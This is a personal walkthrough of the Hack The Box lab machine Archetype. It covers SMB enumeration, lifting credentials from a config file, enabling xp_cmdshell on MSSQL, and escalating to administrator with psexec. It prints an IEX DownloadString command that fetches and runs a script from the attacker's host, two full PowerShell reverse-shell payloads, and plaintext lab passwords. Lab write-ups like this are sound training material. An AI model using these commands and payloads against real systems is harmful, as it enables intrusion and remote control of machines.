# ARCHETYPE - Hack The Box [Starting Point]
## Windows Box from [HackTheBox](http://www.hackthebox.eu)
### [Starting Point: ARCHETYPE](https://app.hackthebox.eu/machines/287)
### Goals
1. User Own [ ]
2. System Own [ ]

#### Enumeration
Initial scan was performed using [rustscan](https://github.com/RustScan/RustScan)

Host: 10.10.10.27
* Open Ports & services:
* 135/tcp Microsoft Windows RPC
* 139/tcpn ettbios-ssn Microsoft Windows netbios-ssn
* 445/tcp microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
* 1433/tcp ms-sql-s Microsoft SQL Server 2017 14.00.1000.00;
    * Target_Name: ARCHETYPE
    * NetBIOS_Domain_Name: ARCHETYPE
    * NetBIOS_Computer_Name: ARCHETYPE
    * DNS_Domain_Name: Archetype
    * DNS_Computer_Name: Archetype
    * Product_Version: 10.0.1776

**Host script results:**
* ms-sql-info: 
    10.10.10.27:1433: 
      Version: 
        name: Microsoft SQL Server 2017 RTM
        number: 14.00.1000.00
        Product: Microsoft SQL Server 2017
        Service pack level: RTM
        Post-SP patches applied: false
      TCP por -->t: 1433
* smb-os-discovery: 
    OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
    Computer name: Archetype
    NetBIOS computer name: ARCHETYPE\x00
    Workgroup: WORKGROUP\x00
    System time: 2021-08-16T19:40:09-07:00
* smb-security-mode: 
    account_used: guest
    authentication_level: user
    challenge_response: supported
    message_signing: disabled (dangerous, but default)
* smb2-security-mode: 
      2.02: 
        Message signing enabled but not required
    smb2-time: 
      date: 2021-08-17T02:40:08
      start_date: N/A

Problem: I attempted to connect to the SMB server using `smbclient -N -L \\\\10.10.10.27\\` to connect with the smb server listed as available. Unfortunately, [SMB1 has been deprecated since 2014](https://www.rapid7.com/db/vulnerabilities/cifs-smb1-deprecated/). I was able to see the shares but was immediately disconnected with the following error: 

```Bash
`do_connect: Connection to 10.10.10.27 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Solution: Found [here](https://www.reddit.com/r/hackthebox/comments/g94dg3/starting_point_help/for91ot/). Connecting to the SMB server without `-N -L` (-N, Don't ask for a password, -L to list the available shares) allowed me to get to the SMB prompt. 

However, I was met with the following prompt:
`Enter WORKGROUP\kali's password:`

Based on the machine's name, I took an educated guess at the password being the default for Kali Linux: `kali`. I was able to view the following shares:

```Bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```
The backups had no comment, so I attempted to connect to that share:
`smbclient \\\\10.10.10.27\\backups`

The result:

```Bash
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8247919 blocks available
```

Using the `get` command, I downloaded `prod.dtsConfig`:

```HTML
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
## .dtsconfig - SSIS Package Configuration [from datatypes.net](https://datatypes.net/open-dtsconfig-files)
*The DTSCONFIG configuration files are related to Microsoft SQL Server. DTSCONFIG file is an SSIS Package Configuration. SQL Server Integration Services (SSIS) is a component of the Microsoft SQL Server software that can be used to perform a broad range of data migration tasks*

This file contains the configuration for the sequel server and the following crednetial information:
* Password: M3g4c0rp123
* User: ARCHETYPE\sql_svc

The next step is to attempt to connect to the `SQL` server listd in the port scan information above. I used [Impacket's](https://github.com/SecureAuthCorp/impacket) `mssqlclient.py`: 

```Bash
┌──(kali㉿kali)-[~]
└─$ mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth                                                 1 ⨯
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

This grants access to the SQL database. Privileges were checked with the `SELECT IS_SRVROLEMEMBER('sysadmin')` command. The database provided the following response:

```Bash
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
              

-----------   

          1
```
I researched this response and found the following in the [Mirosoft Docs - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15) page:


## Syntax `IS_SRVROLEMEMBER`
`IS_SRVROLEMEMBER ( 'role' [ , 'login' ] )`

## Arguments
> `'role'`
> Is the name of the server role that is being checked. role is sysname.
> 
> Valid values for role are user-defined server roles, and the following fixed server roles:
> 
>     * sysadmin
>     * serveradmin
>     * dbcreator
>     * setupadmin
>     * bulkadmin
>     * securityadmin
>     * diskadmin
>     * public
>     * processadmin
> 
> 'login'
> Is the name of the SQL Server login to check. login is sysname, with a default of NULL. If no value is specified, the result is based on the current Execution context. If the parameter contains the word NULL will return NULL.`'role'` is the name of the server role that is being checked. role is `sysname`.

## Return Types


| Return Values | Description                                                  |
|---------------|--------------------------------------------------------------|
|  0            | login is not a member of role. Always returns 0 in Azure SQL |
|  1            | `login` is a member of `role`                                | 
|  `NULL`       | `role` or `login` is not valid, or user has no permission to view |


Since we passed the argument of `'sysadmin'` to this command, the response code 1 confirms we do have `sysadmin` access.

[Microsoft docs](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15) gives us step-by-step on how to [ab]use this ability.

It also provides the following notes:
> If xp_cmdshell must be used, as a security best practice it is recommended to only enable it for the duration of the actual task that requires it.
> 
> * Newly developed code shouldn't use the xp_cmdshell stored procedure and generally it should be left disabled.
> * Some legacy applications require xp_cmdshell to be enabled. If they can't be modified to avoid the use of this stored procedure, you can enable it.

I executed the following:
```Bash
SQL> enable_xp_cmdshell
SQL> EXEC sp_configure 'Show advanced Options', 1;
SQL> reconfigure;
SQL> EXEC sp_configure 'xp_cmdshell',1;
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
```
I did not get a response from the terminal. I did a search for the issue and found a possible solution on [STIGViewer.com](https://www.stigviewer.com/stig/microsoft_sql_server_2012_database_instance/2014-01-05/finding/V-40935):

**Details**
> To determine if xp_cmdshell is enabled, execute the following commands:
> 
> EXEC SP_CONFIGURE 'show advanced option', '1';
> RECONFIGURE WITH OVERRIDE;
> EXEC SP_CONFIGURE 'xp_cmdshell';
> 
> If the value of config_value is 1, this is a finding. 

I tried this as well with no response from the terminal. A [StackOverflow post](https://stackoverflow.com/questions/4402286/how-to-check-if-user-has-system-admin-privileges-in-sql-server-2008-r2) provides a better explanation of how to use the `xp_cmdshell` in SQL:

> Use `IS_SRVROLEMEMBER.`
> 
> `SELECT IS_SRVROLEMEMBER('sysadmin', 'YourLogin')`

No results printed here either. I found [this write-up](https://secinject.wordpress.com/2020/10/20/hack-the-box-archetype-writeup/) which led me to the [Microssoft docs article](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15) for this.

> To allow advanced options to be changed.  
>   `EXECUTE sp_configure 'show advanced options', 1;`
>   `GO`
> To update the currently configured value for advanced options.  
>   `RECONFIGURE;`
>   `GO`
> To enable the feature.  
>   `EXECUTE sp_configure 'xp_cmdshell', 1;`
>   `GO`
> To update the currently configured value for this feature.  
>   `RECONFIGURE;`
>   `GO`

There was no output from the SQL server when I did this. As an experiment, I tried to see if I could serve up a payload using the connection.

I used a [Powershell payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) I acquired from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). I started a server using `python3 -m http.server 80`.

Because we are running the HTTP server, we have to `UFW` to allow us to run a netcat listener on our selected port (I chose 4444). 
* `ufw allow from 10.10.10.27 proto tcp to any port 80,4444`

Then set a listener with `netcat -lvnp 4444`

Since I am not anywhere near a pro with Powershell (because I detest Windows, if I'm honest), I copied and pasted this command in the SQL terminal and hoped for the best.
* `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.158/shell.ps1\");"`

It was at this point I used the `lcd` command in the terminal and found I'd been disconnected from the database. I retried the `xp_cmdshell` setup. This ended up being a saving grace, as I was able to do the following:

```Bash
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> EXEC sp_configure 'xp_cmdshell',1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL
```
Now that we can use the `xp_cmdshell`, we can (with certainty) do the following:

1. `ufw allow from 10.10.15.158 proto tcp to any port 80,4444` to ensure that the ports we are going to be using will not be impeded by the Unix firewall (alternative: you can just type `ufw status`. Mine was disabled.)

2. Open a new tab or terminal window and open the directory in which your payload has been saved and open an HTTP server using `python -m SimpleHTTPServer 80` or `pythonn3 -m http.server 80`

3. Open another terminal window/tab and start a netcat listener on the chosen port we included in our payload script (see my example below) using `ncat -lvnp -p 4444`.

4. Excute the following command to both upload and execute the Powershell payload: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.158/shell.ps1\");"`

## The Payloaad
The walkthrough provided the following script to insert into th `shell.ps1` payload:

```Powershell
$client=New-ObjectSystem.Net.Sockets.TCPClient("10.10.14.3",443);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){;$data=(New-Object-TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex$data2>&1|Out-String);$sendback2=$sendback+"# ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

I obtained some help on the [HackTheBox](http://www.hackthebox.eu) discord channel and got the udpatede code:

```Powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.158",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Admittedly, I am not at all knowledgable about Powershell so I updated the IP address and port and, lo and behold, I go to my netcat listener:

```Bash
listening on [any] 4444 ...
connect to [10.10.15.158] from (UNKNOWN) [10.10.10.27] 49696

# 
```

We have a simple shell! From there, I navigated to the user `sql_svc` at `C:\Users\sql_svc\Desktop` and found the `user.txt` flag.

### Goals
1. User Own [x]
2. System Own [ ]

Navigating with a simple shell is annoying in a Linux system. However, it is an even bigger pain to get back to acheiving the foothold again if you lose the connection. However, I did find a means to acheive a full prompt from [this article](https://stuffjasondoes.com/2018/07/18/bind-shells-and-reverse-shells-with-netcat/). 

The command adds the request to execute `cmd.exe` upon connection. Unfortunately, that didn't work. Based on a [thread on ServerFault](https://serverfault.com/questions/588151/how-to-execute-a-reverse-powershell-shell-using-ncat-or-netcat) it may just be because I used the `.exe` extension. This did not work either.

My next step was to try Impacket's `psexec.py` but I was denied access with that as well The login for the `sql_svc` did not have the correct permissions for me to use it.

 Finally, I was able to make sense of what was provided in the [Archetype Write-up](https://app.hackthebox.eu/machines/287) and ran the following commmand as one (I tought it was two) and gained the `admin` login information.

```powershell
# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

We have the admin login and passoword, which is exciting, but we're not done yet.
* User: administrator
* Password: MEGACORP_4dm1n!!

Now we can use `psexec.py` to log in as the administrator.

```Powershell
sexec.py administrator@10.10.10.27                                                              1 ⨯
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file fJvDSfrD.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service YQNh on 10.10.10.27.....
[*] Starting service YQNh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
We have accessed admin! Now to find the flag. It can be found at `C:\Users\administrator\Desktop`. Because I am not a windows person at the time of writing this, I was not aware and had to search for the command `type` to read it.

### Goals
1. User Own [x]
2. System Own [x]

Take that!

```ASCII
             _--~~--_
"Smeee-     |\      /|
 Heeee!"    | \    / |
           i.--`..'--.i
           \\~* || *~//  
            |\^([])^/|
            '.(-__-).'
             |`.__.'|
     .-~\____`------'____/~-.
    / _-~MMMM`------'MMMM~-_ \
   'T~MMMM/##--_.._--##\MMMM~T'
   |\MMMM/%%%%%%||%%%%%%\MMMM/|
   |=|MM|`:%%%%%||%%%%%;'|MM|=|
   |=|MM|\ `.===!!===.' /|MM|=|
   |=|MM||W\   _--_   /W||MM|=|   
   |/MMM||WW|,'_--_`.|WW||MMM\|
    |MMM||WW/.'    `.\WW||MMM|
   |\MMM||WW||      ||WW||MMM/|
   |=|MM||WW\`.    ,'/WW||MM|=|
   |/MMM||WWW`.~--~,'WWW||MMM\| 
    `:;;'\WWWWW~--~WWWWW/`:;;'
    | U '.`------------',' U |
    i111\J L ]|   | L ] L/|||i
    U111 | ~--_L____--~ | |||U
     UJJ |MMMMMM/\MMMMMM| UJJ
        |\MM
```
